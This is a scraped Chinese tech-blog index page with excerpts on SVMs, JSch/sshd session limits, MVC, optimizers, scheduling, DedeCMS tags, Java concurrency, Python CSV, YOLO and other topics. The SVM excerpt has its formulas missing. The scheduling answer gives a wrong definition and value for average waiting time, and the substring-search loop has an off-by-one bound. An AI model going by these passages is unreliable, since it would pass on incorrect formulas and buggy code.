1.求 将拉格朗日函数L(w,b,α)分别对w,b求偏导且令其等于0，解出 2.求 对α的极大，即： 对上述问题可以使用SMO算法求出α的解为α= 我们知道α≥0，且可以用反证法证明必然存在至少一个α_j&gt;0，若α全部等于0，则由上式可知w=0,而w=0显然不是原始问题的解。对此i，α_j&gt;0，又根据KKT条件α∙g(x) = 0，故g(x)=0,即： 注意到 =1，将 替换1，并提取 ，可以算出： 从而可以写出分类超平面： 分类决策函数为： 2、基于软间隔最大化的线性支持向量机 上面所说的线性可分支持向量机是基于训练样本线性可分的理想状态，当训练样本中存在噪声或者特异点而造成线性不可分时，就需要用到下面讲到的线性支持向量机。 在线性可分支持向量机中，我们假设函数间隔为1，若存在噪声或特异点函数间隔处于 (0,1)中间，那么这些点就不满足问题的约束条件，也就线性不可分。为了解决这样的问题，引入了松弛变量≥0，使得函数间隔与松弛变量的和大于等于1，从而约束条件变为： 同时因为约束条件引入了，所以目标函数也要改变，改为： C&gt;0,称为惩罚系数，一般由应用问题决定，C值大时会对误分类的惩罚增大。最小化目标函数包含了两层含义：一个是使 尽可能小即间隔尽可能大，一个是误分类点尽可能少，C作为两者的调和系数。 这种情况称为软间隔最大化。其问题可以定义为： 依然构造拉格朗日函数，并转换为对偶问题： 支持向量 之前一直说到支持向量机，那么什么是支持向量呢？支持向量机是基于间隔最大化来分类数据集的。在硬间隔最大化的情况下，如下图的红线为分离超平面，粉线和蓝线是将两类点分开的最大间隔线，其到分离超平面的距离分别为，决定这个最大间隔的蓝线上的两个点与粉线的一个点就是分类关键点，称为支持向量。 在软间隔最大化的情况下， 如下图，每个实例点到超平面的距离为。 支持向量由间隔边界（如红圈点）、间隔边界与超平面之间（如绿圈点）或误分点（如蓝圈点）这些对分类起着关键作用的点组成。 3、基于软间隔和核技巧的非线性支持向量机 前面说的数据集都是线性可分或者近似可分的，而实际情况下的数据都是非线性可分的。 这时就需要用到非线性变换，将输入空间上的输入映射到高维特征空间，将非线性问题变换为线性问题，从而利用线性分类器进行分类。例如: 对于非线性的方程,我们取那么原方程就变为： 从而将问题转化为三维空间上的线性可分问题。 核函数就是做这样一个事情，它通过一个非线性变换将输入空间对应到一个希尔伯特空间，使得在输入空间中的超曲面模型对应特征空间中的超平面模型。核函数的定义如下： 设χ是输入空间（欧氏空间或离散集合），Η是特征空间（希尔伯特空间），如果存在一个从χ到Η的映射 φ(x):χ→Η 使得对所有的x,z∈χ，函数Κ(x,z)=φ(x)·φ(z)，例如： 假设输入空间为二维欧氏空间，核函数是Κ(x,z)= 可以取特征空间为三维欧氏空间，记输入x=(x1,x2),z=(z1,z2) 取映射函数为： 则满足Κ(x,z)= 由之前讲到的线性可分的向量机可以知道， 向量机的分类函数取决与属于x与输入样本点的内积，当线性不可分的时候，我们 通过核函数将样本点的内积(x,z)映射为特征空间上内积的(φ(x),φ(z))，仍然使用前面定义的线性分类器，从而实现了有效且简便的非线性分类问题。非线性支持向量机的分类决策函数如下： 其中x是输入，x_i,y_i为样本点，α_i可通过SMO求解得出，b是关于α_i,x_i,y_i的函数，也可以得出，故函数分类结果可以求出。 到这里， 支持向量机的大体思路基本完成了，也就是寻找分类超平面构造分类函数的过程；遇到非线性可分时候，就要想办法将其转换成线性问题，利用线性分类器来分类。求解的过程也就是求得分类超平面的参数问题，当参数不容易求解时，转换为其对偶问题来求，终于，最后可以求出来了。 好吧，支持向量机太长了，先到此为止，下一节介绍 核函数及 SMO算法。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b3dc94b2011a2f12f9cb75ee83d4a52/" rel="bookmark">
			com.jcraft.jsch.JSchException: channel is not opened解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在一个批量下载文件的程序时，发现下载的文件出错，最多只能下载10个文件，剩下的文件丢失了，查看代码，也没有逻辑上的错误，下载丢失也没报错 考虑到之前出现过前台页面传入后台的值丢失，然后在后台对前台输入的信息进行println，发现数据未丢失，也未传2次而多出null，
Session session = connection.getSession(user, ip, port); ChannelExec channelExec = (ChannelExec) session.openChannel("exec"); channelExec.setCommand(cmd); channelExec.setInputStream(null); channelExec.setErrStream(System.err); channelExec.connect(); 然后使用try,catch进行捕捉，查看日志发现在下载第十一个文件的时候总是失败 错误信息com.jcraft.jsch.JSchException: channel is not opened.， 可能原因默认的session时间有限制，然后对session时间进行获取
println("session timeout" + session.getTimeout()) 获取到的session时间是0，发现没什么问题，然后设置了一个长一点的时间试试
session.setTimeout(600000); 问题并没有解决 也可能是环境有问题，查看一下配置文件，可能是session有限制 查看sshd_config
在配置文件中有MaxSessions，原来是10，我把它改成了20，并去掉了“#”符号，保存后重启
然后重新运行工程，发现这次下载的是20个文件，没有丢失，又多试了几次，效果很理想，问题算是解决了吧，原来这里MaxSession默认是的10，所以只能最多连接10次。
//———————————————————————-
上述方法可以解决这个问题，但不是最好的，在原来的代码里存在bug，在这个方法里调用的另一个方法，只有开启，没有关闭，所以导致上述问题
Channel channel = session.openChannel("sftp") channel.disconnect();//添加关闭 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad28b7d3f910934f05eb19f29bd71b92/" rel="bookmark">
			对MVC的理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MVC是三个单词的缩写：Model, View, Controller。 MVC是一种设计模式，目前几乎所有的Web开发框架都建立在MVC模式之上。MVC的意义在于指导开发者将数据与表现解耦，提高代码，特别是模型部分代码的复用性。 实际上，所有模式的存在都是为了代码复用，在前台页面的js或者后端PHP\java中都有很多采用MVC三层设计来组织代码的框架，设置对于CS的应用或者本地APP都包含这种思想。
下面的内容基本是摘录自：http://www.digpage.com/mvc.html，也加入了自己的理解和想法。
Model Model是指数据模型，是对客观事物的抽象。 如一篇博客文章，我们可能会以一个Post类来表示，那么，这个Post类就是数据对象。 同时，博客文章还有一些业务逻辑，如发布、回收、评论等，这一般表现为类的方法，这也是model的内容和范畴。 对于Model，主要是数据、业务逻辑和业务规则。相对而言，这是MVC中比较稳定的部分，一般成品后不会改变。 开发初期的最重要任务，主要也是实现Model的部分。这一部分写得好，后面就可以改得少，开发起来就快。 Model的设计跟数据库是一对多的关系，一个Model对应多个数据库表，描述的是业务对象。识别业务对象的过程是开发工作中最核心也是最难的事情。 有这些经验： - 属性私有，具有set和get函数 - 粒度根据业务逻辑来设计，保持怎样的粒度就看需要对属性进行怎样的操作 - 函数命名要易懂，Model里的函数非常多 - Model还会根据在不同场景下设计不同的字段或者字段的验证规则，这时候可以考虑使用继承的方式来适应不同的场景。
View View是指视图，也就是呈现给用户的一个界面，是model的具体表现形式，也是收集用户输入的地方。 如你在某个博客上看到的某一篇文章，就是某个Post类的表现形式。 View的目的在于提供与用户交互的界面。换句话说，对于用户而言，只有View是可见的、可操作的。 事实上也是如此，你不会让用户看到Model，更不会让他直接操作Model。 你只会让用户看到你想让他看的内容。 这就是View要做的事，他往往是MVC中变化频繁的部分，也是客户经常要求改来改去的地方。 今天你可能会以一种形式来展示你的博文，明天可能就变成别的表现形式了。 在Yii框架里面，似乎是把整个业务对象都交给了View的渲染器，这属于一种前后端不严格分离的做法，但是的确是一种很便捷的做法。 一般没有任何准备数据的代码，如查询数据库、组合成一定格式的字符串等。 这些一般放在Controller里面，并以变量的形式传给视图。 也就是说，视图里面要用到的数据，都是拿来就能直接用的变量。 有这些经验： - 页面经常出现的区域可以考虑做成小组件，譬如分页、下载、某个窗口等等… - view中有的需要PHP框架来渲染，有的却是异步数据渲染，在设计初期就定下来，方便后面的统一。
Controller Contorller指的是控制器，主要负责与model和view打交道。 换句话说，model和view之间一般不直接打交道，他们老死不相往来。view中不会对model作任何操作， model不会输出任何用于表现的东西，如HTML代码等。这俩甩手不干了，那总得有人来干吧，只能Controller上了。 Contorller用于决定使用哪些Model，对Model执行什么操作，为视图准备哪些数据，是MVC中沟通的桥梁。 有这些经验： - 不处理各种参数，尽量不出现 if 语句 - 处理好用户验证、表单重复提交、数据输出、导航view这些工作就好
最后，从MVC三个单词的顺序来看，平时写代码也可以考虑按照这个顺序来写，先想好数据库设计，然后写好Model类，然后写好V，最后写C，写C的时候可以慢慢细化V和M间的关系，从而形成不同的功能点。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4b98036a37da9288f07c3476cc03fa0/" rel="bookmark">
			优化算法基本原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 优化算法基本原理 机器学习就两个问题，一个是model的定义，一个就是如何优化，model是战略，优化则是执行。 在Caffe现在的版本中，主要使用了三种优化算法SGD、AdaGrad、以及NAG，这三种算法快速、高效，缺点就是极容易收敛到局部极值点或者不容易收敛。 a.就个人理解来说，对于大数据的处理，算法的高效率要稍微优于精度。对于大规模的非线性优化来说，通过不断的调参可以有效的降低局部收敛或者不收敛的状况，从某种意义上说机器学习的本质就是调的一手好参：），是经验活也是体力活。 b.至于哪种算法好，可能要针对问题做选择。在几个月前，余凯老师在出门问问组织的一次学术活动中提到，目前工业界最为常用的算法就是mini-batchSGD，性价比最高，其他的一些算法更多的是学术上的目的。 1. 关于stochastic approximation 一般性的优化目标函数都由两部分组成，一个是loss term，一个是regularisationterm，如下所示，前者就是根据model的形式定义的energy function，后者则对于参数的解空间进行了限制。 其中D为数据集，最后的目标函数就是在数据集上的平均。当数据集小的时候，计算量不算很大，但是当数据量非常大的时候，这种策略就会使得计算效率下降，由此引出了stochasticapproximation的策略，也就是使用随机子集对于原函数近似的思路。 其中N&lt;&lt;D，这种策略成功的一个关键点就是大量的数据，主要原因有： a.使用子集拟合出的函数只代表子集的特征，因此单一的子集不可避免会带来误差。 b.随着数据的增加，随机子集的数量越来越多，从概率上讲，其中接近真实函数的分布的的子集会占多数，因此总体上而言，拟合的函数会越来越接近全部数据拟合的函数。 2. Stochastic gradient decent（SGD）算法 优化算法就是看迭代公式，关键的就是步长和方向。 caffe中SGD权重迭代公式如下，W_{t}为t时刻的参数，V_{t}为t时刻的增量，a为learningrate，u为前一次更新的权重 通过调节a和u可以有效的改变迭代速度以及迭代的方向。可以看出W_{i}的更新是和上次增量以及梯度线性相关的的。 在Caffe的文档中给出了一个基本的调参规则 a. 初始的learning rate建议设置为0.01。 b. 在迭代过程中当loss到达了一个明显的“plateau”的时候，则以10倍的速度drop learningrate，相当于稍微减少步长， c. u是一个调解参数，一般设置为0.9，这个参数起到一个平滑的作用，可以让SGD算法更加稳定和快速 d. u和a是一个反相关的，增加u，则降低a，反之亦然。 3. AdaGrad算法 迭代规则为 其中i是指的W中的每一个维度。这个迭代规则的意思是采用前面的所有时间的梯度生成一个归一化的因子，对当前的梯度进行一次尺度变换。这个尺度的含义就是如果前面函数梯度大，那么当前增量的加速度就小一点，反之则大一点；整个趋势还是随着迭代的次数增加，增量放缓。 4. Nesterov‘s accelerated Gradient （NAG） 这个算法严格的说来是凸优化中的算法，具有O(1/t^2)的收敛率，收敛速度比较快。因为DNN是一个non-convex的model，所以NAG方法并不能达到这个收敛速度。caffe文档中指出，这个方法对于某些deeplearning的 architecture是非常有效的。 这个公式和SGD方法很类似，不同之处在于其梯度项，不再是简单的当前位置的梯度，而是当前位置加上增量之后的新位置处的梯度。 5. 一点思考 5年前随着Sparserepresentation的热潮的兴起，做很多老的凸优化的算法在新的计算机视觉任务中显示出了巨大的能力，比如APG、NAG、ADMM等，人们发现了有趣的现象，效率高优化算法往往都是老算法，越老效率越高，主要原因是早些时候，计算能力非常有限，早期的数学家只好真正从算法中挤水分；随着时代的发展，计算能力强了，算法效率差不多就行了；现在到了大数据时代，效率终于又成为了瓶颈，所以老算法又焕发了第二春。另外一些二阶段方法Newton，LBFGS等因为数据存储量以及计算量大，在大规模的数据中可能不如最简单的SGD类方法好用，当然选用什么算法，要视计算资源以及计算任务而定。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6165ac9f2b442da5138fde83883b483b/" rel="bookmark">
			一个神奇的网站（快快乐乐写时序图）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一个神奇的网站 一个神奇的网站:https://www.websequencediagrams.com/
代码即效果如下: 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12f90738d11334c8151e4f4f9d9f00e6/" rel="bookmark">
			作业周转时间以及平均等待时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现有4个同时到达的作业J1,J2,J3和J4,它们的执行时间分别是1小时，3小时，5小时，7小时，系统按单道方式运行且采用短作业优先算法，则平均周转时间是（）小时 平均等待时间：将所有作业的运行时间加起来除以总的作业数 （1+3+5+7）/4=4 平均周转时间为 （1 + （1+3） + （1+3+5 ）+ （ 1+3+5+7））/4=7.5
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e637f2600a0bb0d04f2120e61d73c5d/" rel="bookmark">
			织梦调用友情链接的调用及样式，文件位置为：\\include\\taglib\\flink.lib.php
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		织梦调用友情链接的文件位置为：\include\taglib\flink.lib.php
调用标签为：
{dede:flink titlelen='24=' row='20' type='text'} [field:link /] {/dede:flink}
演示参考：
&lt;div id=lianjie&gt;
&lt;ul&gt;
{dede:flink titlelen='24=' row='20' type='text'}
&lt;li&gt;&lt;A href=" [field:link /] " target=_blank&gt; [field:link /] &lt;/A&gt;&lt;/LI&gt;
{/dede:flink}&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
titlelen='24' 表示标题长度
row='20' 表示调用条数
type='text'表示调用文本格式
这样也行：
友情链接：&lt;div class="link"&gt;&lt;ul&gt;{dede:flink row='50'/}&lt;/ul&gt;&lt;/div&gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/419b8600512d2a57421499ddca18e2a9/" rel="bookmark">
			CyclicBarrier和CountDownLatch区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这两天写多线程时，用到了CyclicBarrier，下意识的认为CyclicBarrier和CountDownLatch作用很像，就翻阅资料查了一下，说一下他们的区别吧
CyclicBarrier和CountDownLatch 都位于java.util.concurrent 这个包下
CountDownLatchCyclicBarrier减计数方式加计数方式计算为0时释放所有等待的线程计数达到指定值时释放所有等待线程计数为0时，无法重置计数达到指定值时，计数置为0重新开始调用countDown()方法计数减一，调用await()方法只进行阻塞，对计数没任何影响调用await()方法计数加1，若加1后的值不等于构造方法的值，则线程阻塞不可重复利用可重复利用 一、CountDownLatch用法 CountDownLatch类只提供了一个构造器：
public CountDownLatch(int count) { }; //参数count为计数值 然后下面这3个方法是CountDownLatch类中最重要的方法：
public void await() throws InterruptedException { }; //调用await()方法的线程会被挂起，它会等待直到count值为0才继续执行 public boolean await(long timeout, TimeUnit unit) throws InterruptedException { }; //和await()类似，只不过等待一定的时间后count值还没变为0的话就会继续执行 public void countDown() { }; //将count值减1 CountDownLatch， 一个同步辅助类，在完成一组正在其他线程中执行的操作之前，它允许一个或多个线程一直等待。
下面举个例子说明： package main.java.CountDownLatch; import java.util.concurrent.CountDownLatch; /** * PROJECT_NAME:downLoad * Author:lucaifang * Date:2016/3/18 */ public class countDownlatchTest { public static void main(String[] args) throws InterruptedException { CountDownLatch countDownLatch = new CountDownLatch(5); for(int i=0;i&lt;5;i++){ new Thread(new readNum(i,countDownLatch)).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/419b8600512d2a57421499ddca18e2a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0072828164f3e3bde37e212703df10ae/" rel="bookmark">
			no server suitable for synchronization found的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果你使用yum install ntp命令安装ntp之后，使用这个命令ntpdate pool.ntp.org
会有如下提示18 Mar 22:40:12 ntpdate[1441]: no server suitable for synchronization found
解决办法命令行输入service ntpd start回车
会看到Starting ntpd: [ OK ]
然后再使用service ntpd status回车
看到ntpd (pid 1211) is running...
这个时候再使用这个命令service ntpd start回车
会看到18 Mar 22:53:11 ntpdate[1230]: the NTP socket is in use, exiting
是不是很简单
转载于:https://www.cnblogs.com/wenhouniba/p/5292219.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cd58e1465a05cdc7e5e68ac29167344/" rel="bookmark">
			python列表、字典与csv
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常数据分析时最常打交道的是csv文件和list,dict类型。涉及到的主要需求有：
将一个二重列表[[],[]]写入到csv文件中从文本文件中读取返回为列表将一字典写入到csv文件中从csv文件中读取一个字典从csv文件中读取一个计数字典 实现如下：
# 功能：将一个二重列表写入到csv文件中 # 输入：文件名称，数据列表 def createListCSV(fileName="", dataList=[]): with open(fileName, "wb") as csvFile: csvWriter = csv.writer(csvFile) for data in dataList: csvWriter.writerow(data) csvFile.close 》
# 功能：从文本文件中读取返回为列表的形式 # 输入：文件名称，分隔符（默认,） def readListCSV(fileName="", splitsymbol=","): dataList = [] with open(fileName, "r") as csvFile: dataLine = csvFile.readline().strip("\n") while dataLine != "": tmpList = dataLine.split(splitsymbol) dataList.append(tmpList) dataLine = csvFile.readline().strip("\n") csvFile.close() return dataList 》
# 功能：将一字典写入到csv文件中 # 输入：文件名称，数据字典 def createDictCSV(fileName="", dataDict={}): with open(fileName, "wb") as csvFile: csvWriter = csv.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cd58e1465a05cdc7e5e68ac29167344/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2dd64d850f75c3cb1d4b3ea9aa8e9f6/" rel="bookmark">
			论文阅读笔记：(YOLO 看一次就够了) You Only Look Once: Unified, Real-Time Object Detection
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		尊重原创，转载请注明：http://blog.csdn.net/tangwei2014
这是继RCNN，fast-RCNN 和 faster-RCNN之后，rbg（Ross Girshick）大神挂名的又一大作，起了一个很娱乐化的名字：YOLO。
虽然目前版本还有一些硬伤，但是解决了目前基于DL检测中一个大痛点，就是速度问题。
其增强版本GPU中能跑45fps，简化版本155fps。
论文下载：http://arxiv.org/abs/1506.02640
代码下载：https://github.com/pjreddie/darknet
本篇博文focus到方法上。实验结果等整理全了再奉上。
YOLO的核心思想 YOLO的核心思想就是利用整张图作为网络的输入，直接在输出层回归bounding box的位置和bounding box所属的类别。
没记错的话faster RCNN中也直接用整张图作为输入，但是faster-RCNN整体还是采用了RCNN那种 proposal+classifier的思想，只不过是将提取proposal的步骤放在CNN中实现了。
2.YOLO的实现方法
将一幅图像分成SxS个网格(grid cell)，如果某个object的中心 落在这个网格中，则这个网格就负责预测这个object。
每个网格要预测B个bounding box，每个bounding box除了要回归自身的位置之外，还要附带预测一个confidence值。
这个confidence代表了所预测的box中含有object的置信度和这个box预测的有多准两重信息，其值是这样计算的：
其中如果有object落在一个grid cell里，第一项取1，否则取0。 第二项是预测的bounding box和实际的groundtruth之间的IoU值。
每个bounding box要预测(x, y, w, h)和confidence共5个值，每个网格还要预测一个类别信息，记为C类。则SxS个网格，每个网格要预测B个bounding box还要预测C个categories。输出就是S x S x (5*B+C)的一个tensor。
注意：class信息是针对每个网格的，confidence信息是针对每个bounding box的。
举例说明: 在PASCAL VOC中，图像输入为448x448，取S=7，B=2，一共有20个类别(C=20)。则输出就是7x7x30的一个tensor。
整个网络结构如下图所示：
在test的时候，每个网格预测的class信息和bounding box预测的confidence信息相乘，就得到每个bounding box的class-specific confidence score:
等式左边第一项就是每个网格预测的类别信息，第二三项就是每个bounding box预测的confidence。这个乘积即encode了预测的box属于某一类的概率，也有该box准确度的信息。
得到每个box的class-specific confidence score以后，设置阈值，滤掉得分低的boxes，对保留的boxes进行NMS处理，就得到最终的检测结果。
3.YOLO的实现细节
每个grid有30维，这30维中，8维是回归box的坐标，2维是box的confidence，还有20维是类别。
其中坐标的x,y用对应网格的offset归一化到0-1之间，w,h用图像的width和height归一化到0-1之间。
在实现中，最主要的就是怎么设计损失函数，让这个三个方面得到很好的平衡。作者简单粗暴的全部采用了sum-squared error loss来做这件事。
这种做法存在以下几个问题：
第一，8维的localization error和20维的classification error同等重要显然是不合理的；
第二，如果一个网格中没有object（一幅图中这种网格很多），那么就会将这些网格中的box的confidence push到0，相比于较少的有object的网格，这种做法是overpowering的，这会导致网络不稳定甚至发散。
解决办法：
更重视8维的坐标预测，给这些损失前面赋予更大的loss weight, 记为在pascal VOC训练中取5。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2dd64d850f75c3cb1d4b3ea9aa8e9f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90cb8e5a49a78c6690841ed031f40e44/" rel="bookmark">
			[iOS]isKindOfClass、isMemberOfClass、isSubclassOfClass
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近招聘了一段时间，有些面试者我会提到 isKindOfClass 和 isMemberOfClass 的区别和使用场景。来的人很少有能答对的，我觉得这是很基础的东西，所以在这里简单的用代码加说明的形式列出来。
【其实我个人觉得，从方法的名称就已经能猜出他们之间的区别了。^_^】
@interface SuperClass : NSObject @end @implementation SuperClass @end @interface SubClass : SuperClass @end @implementation SubClass + (void)load { // 测试代码 SubClass *objSub = [[SubClass alloc] init]; SuperClass *objSuper = [[SuperClass alloc] init]; NSLog(@"isKindOfClass Test"); NSLog(@"%@", [objSub isKindOfClass:[SuperClass class]] ? @"YES" : @"NO"); // YES NSLog(@"%@", [objSub isKindOfClass:[SubClass class]] ? @"YES" : @"NO"); // YES NSLog(@"%@", [objSuper isKindOfClass:[SuperClass class]] ? @"YES" : @"NO"); // YES NSLog(@"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90cb8e5a49a78c6690841ed031f40e44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/073eb8dc5f6d0c4e5133413c8083ba3c/" rel="bookmark">
			Google Java编程风格指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Google Java编程风格指南 January 20, 2014 作者：Hawstein 出处： http://hawstein.com/posts/google-java-style.html 声明：本文采用以下协议进行授权： 自由转载-非商用-非衍生-保持署名|Creative Commons BY-NC-ND 3.0 ，转载请注明作者及出处。 目录 前言源文件基础源文件结构格式命名约定编程实践Javadoc后记 前言 这份文档是Google Java编程风格规范的完整定义。当且仅当一个Java源文件符合此文档中的规则， 我们才认为它符合Google的Java编程风格。
与其它的编程风格指南一样，这里所讨论的不仅仅是编码格式美不美观的问题， 同时也讨论一些约定及编码标准。然而，这份文档主要侧重于我们所普遍遵循的规则， 对于那些不是明确强制要求的，我们尽量避免提供意见。
1.1 术语说明 在本文档中，除非另有说明：
术语class可表示一个普通类，枚举类，接口或是annotation类型(@interface)术语comment只用来指代实现的注释(implementation comments)，我们不使用“documentation comments”一词，而是用Javadoc。 其他的术语说明会偶尔在后面的文档出现。
1.2 指南说明 本文档中的示例代码并不作为规范。也就是说，虽然示例代码是遵循Google编程风格，但并不意味着这是展现这些代码的唯一方式。 示例中的格式选择不应该被强制定为规则。
源文件基础 2.1 文件名 源文件以其最顶层的类名来命名，大小写敏感，文件扩展名为.java。
2.2 文件编码：UTF-8 源文件编码格式为UTF-8。
2.3 特殊字符 2.3.1 空白字符 除了行结束符序列，ASCII水平空格字符(0x20，即空格)是源文件中唯一允许出现的空白字符，这意味着：
所有其它字符串中的空白字符都要进行转义。制表符不用于缩进。 2.3.2 特殊转义序列 对于具有特殊转义序列的任何字符(\b, \t, \n, \f, \r, “, ‘及\)，我们使用它的转义序列，而不是相应的八进制(比如\012)或Unicode(比如\u000a)转义。
2.3.3 非ASCII字符 对于剩余的非ASCII字符，是使用实际的Unicode字符(比如∞)，还是使用等价的Unicode转义符(比如\u221e)，取决于哪个能让代码更易于阅读和理解。
Tip: 在使用Unicode转义符或是一些实际的Unicode字符时，建议做些注释给出解释，这有助于别人阅读和理解。
例如：
String unitAbbrev = "μs"; | 赞，即使没有注释也非常清晰 String unitAbbrev = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/073eb8dc5f6d0c4e5133413c8083ba3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffc6e8ad8b36ab2a5e3cbc6d0e3495c7/" rel="bookmark">
			HTTP 405 错误 – 方法不被允许 (Method not allowed)【转载】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTP 协议定义一些方法，以指明为获取客户端（如您的浏览器或我们的 CheckUpDown 机器人）所指定的具体网址资源而需要在 Web 服务器上执行的动作。则这些方法如下：
OPTIONS( 选项 ) ：查找适用于一个特定网址资源的通讯选择。 在不需执行具体的涉及数据传输的动作情况下， 允许客户端来确定与资源相关的选项以及 / 或者要求， 或是一个服务器的性能。GET( 获取 ) ：检索由网址资源所确定的信息，如获取一个特定的网页或图片。这是最常用的方法。HEAD( 头 ) ：除了服务器只反馈标头信息而不是网址资源所确定的信息本身外， 基本同于 GET ( 获取 ) 。 可用于获取一个请求所要求的响应实体的元信息 ( metainformation) ，而不需传输响应实体本身。 经常用来测试超文本链接的有效性， 可达性， 和最近的修改。POST( 投寄 ) ：将数据提交到 Web 服务器，如 1 ）在电子公告板，新闻组中，或向 邮件名单发送信息， 2 ）提供输入数据 - 通常由一个公共网关接口(CGI) 表， 到 一个数据处理进程， 3 ）直接将记录添加到一个数据库中。PUT( 放置 ) ：将一个具体网址的数据设置（ 置入 / 替换）成客户提交的新数据。例如，将新的网页上载给服务器。DELETE( 删除 ) ：删除与网址资源相关的数据。例如，删除网页。TRACE( 跟踪 ) ：运行请求信息的一个远程应用层回送。 实际上是一个 'ping', 用以测试 Web 服务器正在从客户端接收什么数据。CONNECT( 连接 ) ：保留以便通过代理服务器和隧道一起使用（如 SSL ）。这种方法只在 HTTP 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ffc6e8ad8b36ab2a5e3cbc6d0e3495c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0695bf2399b4caad28d41116d15c1748/" rel="bookmark">
			子字符串查找算法_归纳及汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字符串的一种基本操作就是子字符串查找：给定一段长度为N的文本和一段长度为M的模式字符串，在文本中找到一个和该模式相符的字符串。
模式-&gt; ABCDE 正文-&gt; SJAHDJKS”ABCDE”QWIYUE
上文加引号处就是被搜索出来的结果。 相信这个大家肯定是经常遇到的吧，不管是使用　“CTRL+F”　搜索还是在一些搜索栏中搜索一段文字，将包含该文字的书籍输出中，我们都会遇到，所以在这里对子字符串的查找算法进行一个归纳及汇总。
暴力子字符串查找算法 这种算法是一种比较简单而使用广泛的暴力算法，在最坏的情况下运行时间与MN成正比，但是在许多的正常情况下，它的实际运行时间一般与M+N成正比（在不同情况下，与M+N成正比的概率越高，就越好）。
算法思路 将模式文本的首字母一个个的与文本进行比较，如果相同就比较模式文本的下一个字母，如果在N-M的循环中还没有找到，则表明不匹配，结束循环。这里N-M次循环是因为M为模板文本的长度，N为文本的长度，超过这个数值的话剩下的字符串长度肯定小于M的，就肯定不匹配。因此就不用比较了
代码实现
/** * 暴力子字符串查找算法 * 利用两层循环 * 一个变量跟踪正文文本，一个变量跟踪模板文本 * * @param pat * 模板文本 * @param txt * 正文文本 * @return */ public static String search(String pat, String txt) { int M = pat.length(); int N = txt.length(); // 用j来跟踪模板文本 int j = 0; // 用i来跟踪正文文本 for(int i = 0; i &lt; N - M; i++) { // 依次匹配，一个字符一个字符的匹配 // 如果匹配成功，就返回i的值 for(j = 0; j &lt; M; j++) { if (txt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0695bf2399b4caad28d41116d15c1748/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2e7c7a9f8b39da9c862f661396247cb/" rel="bookmark">
			C&#43;&#43;：冒号与双冒号用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.冒号（:）用法
（1）类名冒号：定义类的继承。
（2）构造函数后面的冒号：分割作用，类给成员变量赋值。
初始化列表，更适用于成员变量的常量const型。
struct _XXX{ _XXX() : y(0xc0) {} };（3） public:和private:后面的冒号：后面定义的所有成员都是公有或私有的。直到下一个"public:”或"private:”出现为止。"private:"为默认处理。 （4）表示变量占几个bit空间
typedef struct _XXX{ unsigned char a:4; unsigned char c; } ; XXX 2. 作用域限定符号:: 作用：
（1） 在类外部声明成员函数。void Point::Area(){};
（2）调用类的静态方法： 如：CDisplay::display()。
（3）调用全局函数；表示引用成员函数变量及作用域，作用域成员运算符 例：System::Math::Sqrt() 相当于System.Math.Sqrt()。
如果 ::前面没有域名 那么就是全局。
双冒号前面可以是 类名，命名空间来限定双冒号后面的内容从哪里读取。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
